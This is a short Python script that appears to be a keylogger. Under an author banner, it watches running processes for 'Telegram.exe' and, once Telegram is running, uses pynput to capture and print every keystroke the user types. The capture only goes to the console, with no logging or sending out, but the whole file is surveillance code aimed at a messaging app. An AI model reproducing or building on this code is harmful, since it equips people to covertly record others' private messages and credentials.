from pynput import keyboard
import os
import psutil
def banner():
    banner = """
    _______ .___________.____    __    ____  __      .______   
    |   ____||           |\   \  /  \  /   / |  |     |   _  \  
    |  |__   `---|  |----` \   \/    \/   /  |  |     |  |_)  | 
    |   __|      |  |       \            /   |  |     |   ___/  
    |  |         |  |        \    /\    /    |  `----.|  |      
    |__|         |__|         \__/  \__/     |_______|| _|      
               
               ____________________
               __                __
               __ Alisa-Alikhani __
               __    @AL13A_7    __       
               ____________________                                                                                                                                                                                                      
    """
    os.system("cls")
    print(banner)
banner()

def main():
    with keyboard.Listener(on_press=key_log) as ln:
        ln.join()

def key_log(key):
    print(key)



while True:
    for proc in psutil.process_iter():
        processName = proc.name()
        if "Telegram.exe" in processName:
            banner()
            main()
            

